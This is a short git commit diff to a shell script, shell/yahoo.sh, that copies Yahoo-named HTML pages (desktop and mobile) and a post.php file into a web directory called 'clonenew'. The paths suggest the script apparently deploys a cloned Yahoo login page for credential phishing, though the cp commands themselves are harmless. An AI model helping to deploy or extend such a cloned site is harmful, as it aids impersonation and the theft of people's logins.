3d0bf75adbe52c7cf59a24ce2f27f262043471f9
mak <makindosx@gmail.com>
2017-11-30 18:10:38 +0200

    Add files via upload

--- shell/yahoo.sh
+++ shell/yahoo.sh
@@ -1,3 +1,5 @@
 cp -avr /var/www/clonenew/yahoo/index.html /var/www/clonenew/
+cp -avr /var/www/clonenew/yahoo/pc.html /var/www/clonenew/
+cp -avr /var/www/clonenew/yahoo/mobile.html /var/www/clonenew/
 cp -avr /var/www/clonenew/yahoo/post.php /var/www/clonenew/
 
